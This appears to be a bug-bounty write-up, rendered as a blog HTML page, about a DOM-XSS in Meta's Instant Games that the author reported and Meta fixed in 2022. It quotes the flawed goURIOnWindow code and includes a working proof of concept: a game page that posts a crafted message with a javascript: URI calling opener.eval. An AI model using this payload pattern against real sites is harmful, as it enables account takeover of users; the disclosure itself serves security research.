@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>DOM-XSS in Instant Games due to improper verification of supplied URLs | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="DOM-XSS in Instant Games due to improper verification of supplied URLs" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the &quot;goURIOnWindow&quot; Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS. Details The function inside goURIOnWindow module has this code __d(&quot;goURIOnWindow&quot;, [&quot;ConstUriUtils&quot;, &quot;FBLogger&quot;, &quot;err&quot;], (function(a, b, c, d, e, f, g) { &quot;use strict&quot;; function a(a, b) { var e = typeof b === &quot;string&quot; ? d(&quot;ConstUriUtils&quot;).getUri(b) : b; if (e) a.location = e.toString(); else { a = &quot;Invalid URI &quot; + b.toString() + &quot; provided to goURIOnWindow&quot;; c(&quot;FBLogger&quot;)(&quot;comet_infra&quot;).blameToPreviousFrame().mustfix(a) } } g[&quot;default&quot;] = a } ), 98); It checks if the supplied argument which should be the URL to be passed to window.location is a &quot;String&quot; or not, if it is not then is would just do toString() conversion and set the value to window.location. The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a &quot;String&quot; which then would use ConstUriUtils to create a &quot;URI&quot; Object and verify it&#39;s scheme to be whitelisted OR a &quot;URI&quot; Object which must be secure and for that it automatically just convert it to String using toString() which would return &quot;null&quot; in case the scheme is not whitelisted. However, it doesn&#39;t check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to &quot;goURIOnWindow&quot; without previously converting the input using &quot;ConstUriUtils&quot; or &quot;URI&quot; modules. Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game: - useInteractivePluginSDKMessageHandler.react, and exactly &quot;openurlasync&quot; message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn&#39;t invest much time trying to hit this one. - InstantGamesOpenExternalLinkDialog.react, which is called when a &quot;showgenericdialogasync&quot; message is received with request set to &quot;open_external_link&quot;. This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games: index.html: &lt;!DOCTYPE html&gt;" />
+<meta property="og:description" content="This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the &quot;goURIOnWindow&quot; Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS. Details The function inside goURIOnWindow module has this code __d(&quot;goURIOnWindow&quot;, [&quot;ConstUriUtils&quot;, &quot;FBLogger&quot;, &quot;err&quot;], (function(a, b, c, d, e, f, g) { &quot;use strict&quot;; function a(a, b) { var e = typeof b === &quot;string&quot; ? d(&quot;ConstUriUtils&quot;).getUri(b) : b; if (e) a.location = e.toString(); else { a = &quot;Invalid URI &quot; + b.toString() + &quot; provided to goURIOnWindow&quot;; c(&quot;FBLogger&quot;)(&quot;comet_infra&quot;).blameToPreviousFrame().mustfix(a) } } g[&quot;default&quot;] = a } ), 98); It checks if the supplied argument which should be the URL to be passed to window.location is a &quot;String&quot; or not, if it is not then is would just do toString() conversion and set the value to window.location. The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a &quot;String&quot; which then would use ConstUriUtils to create a &quot;URI&quot; Object and verify it&#39;s scheme to be whitelisted OR a &quot;URI&quot; Object which must be secure and for that it automatically just convert it to String using toString() which would return &quot;null&quot; in case the scheme is not whitelisted. However, it doesn&#39;t check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to &quot;goURIOnWindow&quot; without previously converting the input using &quot;ConstUriUtils&quot; or &quot;URI&quot; modules. Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game: - useInteractivePluginSDKMessageHandler.react, and exactly &quot;openurlasync&quot; message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn&#39;t invest much time trying to hit this one. - InstantGamesOpenExternalLinkDialog.react, which is called when a &quot;showgenericdialogasync&quot; message is received with request set to &quot;open_external_link&quot;. This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games: index.html: &lt;!DOCTYPE html&gt;" />
+<link rel="canonical" href="http://localhost:4000/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html" />
+<meta property="og:url" content="http://localhost:4000/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-01-29T13:04:43+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="DOM-XSS in Instant Games due to improper verification of supplied URLs" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-29T13:04:43+01:00","datePublished":"2023-01-29T13:04:43+01:00","description":"This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the &quot;goURIOnWindow&quot; Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS. Details The function inside goURIOnWindow module has this code __d(&quot;goURIOnWindow&quot;, [&quot;ConstUriUtils&quot;, &quot;FBLogger&quot;, &quot;err&quot;], (function(a, b, c, d, e, f, g) { &quot;use strict&quot;; function a(a, b) { var e = typeof b === &quot;string&quot; ? d(&quot;ConstUriUtils&quot;).getUri(b) : b; if (e) a.location = e.toString(); else { a = &quot;Invalid URI &quot; + b.toString() + &quot; provided to goURIOnWindow&quot;; c(&quot;FBLogger&quot;)(&quot;comet_infra&quot;).blameToPreviousFrame().mustfix(a) } } g[&quot;default&quot;] = a } ), 98); It checks if the supplied argument which should be the URL to be passed to window.location is a &quot;String&quot; or not, if it is not then is would just do toString() conversion and set the value to window.location. The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a &quot;String&quot; which then would use ConstUriUtils to create a &quot;URI&quot; Object and verify it&#39;s scheme to be whitelisted OR a &quot;URI&quot; Object which must be secure and for that it automatically just convert it to String using toString() which would return &quot;null&quot; in case the scheme is not whitelisted. However, it doesn&#39;t check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to &quot;goURIOnWindow&quot; without previously converting the input using &quot;ConstUriUtils&quot; or &quot;URI&quot; modules. Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game: - useInteractivePluginSDKMessageHandler.react, and exactly &quot;openurlasync&quot; message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn&#39;t invest much time trying to hit this one. - InstantGamesOpenExternalLinkDialog.react, which is called when a &quot;showgenericdialogasync&quot; message is received with request set to &quot;open_external_link&quot;. This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games: index.html: &lt;!DOCTYPE html&gt;","headline":"DOM-XSS in Instant Games due to improper verification of supplied URLs","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html"},"url":"http://localhost:4000/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">DOM-XSS in Instant Games due to improper verification of supplied URLs</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-01-29T13:04:43+01:00" itemprop="datePublished">Jan 29, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
+<p style="font-size:30px">
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>This bug could allow a malicious actor to takeover Facebook ( and Meta ) accounts after tricking the user to play an Instant Game. This bug happens since the "goURIOnWindow" Module which is widely used in Meta platforms fails to verify the scheme of the supplied URL which means we can supply a javascript URI scheme and achieve DOM-XSS.</p>
+<p><!--more--><br />
+<!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
+<p style="font-size:30px">Details</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>The function inside <strong>goURIOnWindow</strong> module has this code</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="javascript" class="language-javascript">__d("goURIOnWindow", ["ConstUriUtils", "FBLogger", "err"], (function(a, b, c, d, e, f, g) {
+    "use strict";
+    function a(a, b) {
+        var e = typeof b === "string" ? d("ConstUriUtils").getUri(b) : b;
+        if (e)
+            a.location = e.toString();
+        else {
+            a = "Invalid URI " + b.toString() + " provided to goURIOnWindow";
+            c("FBLogger")("comet_infra").blameToPreviousFrame().mustfix(a)
+        }
+    }
+    g["default"] = a
+}
+), 98);</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><br>It checks if the supplied argument which should be the URL to be passed to window.location is a "String" or not, if it is not then is would just do toString() conversion and set the value to window.location. <br><br>The process here is vulnerable since goURIOnWindow assumes that the value supplied is either a "String" which then would use <strong>ConstUriUtils</strong> to create a "URI" Object and verify it's scheme to be whitelisted <strong>OR</strong> a "URI" Object which must be secure and for that it automatically just convert it to String using toString() which would return "null" in case the scheme is not whitelisted. <br><br>However, it doesn't check if the Object is an instance of the URI object and because of that we can just supply for example an array which contains a javascript URI and it would pass the check.<br>I found out that Instant Games is vulnerable and other places too in the different places in the platform are with attacker controlled input being passed to "goURIOnWindow" without previously converting the input using "ConstUriUtils" or "URI" modules. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Two modules seemed vulnerable in Instant Games, both are accessible by the attacker since they are handlers for cross window messages received by the iframe window hosting the game:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>- <strong>useInteractivePluginSDKMessageHandler.react</strong>, and exactly "<strong>openurlasync</strong>" message. This one is only available to few games and few type of games like canvas_on_blue/ canvas_on_comet. I didn't invest much time trying to hit this one.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>- <strong>InstantGamesOpenExternalLinkDialog.react</strong>, which is called when a "<strong>showgenericdialogasync</strong>" message is received with request set to "open_external_link". This one is vulnerable too but requires a click. Below the PoC to exploit this one while hosting a game in Instant Games:</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>index.html:</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="markup" class="language-markup"><!DOCTYPE html>
+<html>
+<body>
+<script type="text/javascript">
+
+const display = window.Display;
+const OTHER_APP_ID = '<YOUR OTHER APP ID HERE>';
+const CUSTOM_DATA = { 'custom_data': 42 };
+window.onload = function() {
+FBInstant.initializeAsync()
+.then(FBInstant.startGameAsync)
+};
+
+</script>
+<script>
+
+var i = 0;
+function fun(e) {
+
+if (i == 5)
+window.top.postMessage({"type":"showgenericdialogasync","content":{"data":"{\"url\":[\"javascript:opener.eval('new AsyncRequest(\\\\'/api/graphql/\\\\').setData({doc_id:\\\\'xxxxxxxxxxxxxx\\\\',variables:\\\\'{}\\\\'}).send()');\"]}","request":"open_external_link","sdkVersion":"7.0","promiseID":"showgenericdialogasync_2428951442"},"destination":"fbinstant-ATTACKERAPPID"},"*");
+
+i++;
+}
+
+onmessage = (e)=>{f=e.data; if (typeof f !== "string") {fun(e.source)}}
+</script>
+</body>
+</html></code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>fb-app-config.json:</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:code --></p>
+<pre class="wp-block-code"><code lang="json" class="language-json">{ "instant_games": { "platform_version": "RICH_GAMEPLAY", "custom_update_templates": { "play_turn": { "example": "Play" } },"navigation_menu_version": "NAV_FLOATING",}}</code></pre>
+<p><!-- /wp:code --></p>
+<p><!-- wp:paragraph --></p>
+<p><strong>javascript:opener.eval('new AsyncRequest(\\\\'/api/graphql/\\\\').setData({doc_id:\\\\'xxxxxxxxxxxxxx\\\\',variables:\\\\'{}\\\\'}).send()');\"]}</strong> would use a Facebook module to make an async request to the GraphQL endpoint.</p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Later, Meta confirmed that this was causing DOM-XSS in other places in the Facebook platform and those ones didn't require user interaction. </p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph {"style":{"typography":{"fontSize":"30px"}}} --></p>
+<p style="font-size:30px"><strong>Timeline</strong></p>
+<p><!-- /wp:paragraph --></p>
+<p><!-- wp:paragraph --></p>
+<p>Oct 24, 2022&mdash; Report Sent <br>Oct 24, 2022&mdash;  Acknowledged by Meta<br>Dec 12, 2022&mdash; Fixed by Meta<br>Dec 13, 2022 &mdash; $62500 bounty with bonuses awarded by Meta. ( although only $28125 was paid here, Meta rules about ATOs <a href="https://www.facebook.com/whitehat/payout_guidelines/account_takeover">https://www.facebook.com/whitehat/payout_guidelines/account_takeover</a> clearly says that XSS that directly leads to ATO should be rewarded $50000 not including additional bonuses, i raised this concern to them and this should be corrected )<br><br> </p>
+<p><!-- /wp:paragraph --></p>
+
+  </div><a class="u-url" href="/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
